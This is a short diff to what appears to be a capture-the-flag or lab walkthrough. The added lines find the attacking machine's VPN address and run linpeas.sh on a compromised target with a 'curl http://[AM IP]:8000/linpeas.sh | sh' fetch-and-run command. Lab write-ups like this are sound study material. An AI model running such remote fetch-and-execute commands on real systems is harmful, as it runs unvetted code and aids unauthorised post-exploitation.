@@ -431,4 +431,10 @@ www-data@ip-10-66-172-224:/home/think$
 #setup python server on AM:
 python3 -m http.server 8000
 
+#find ip of my AM
+ip a | grep tun0
+
+#upload /linpeas to TM assuming it is on AM and you are in dir of file
+curl http://[AM IP]:8000/linpeas.sh | sh
 ```
+
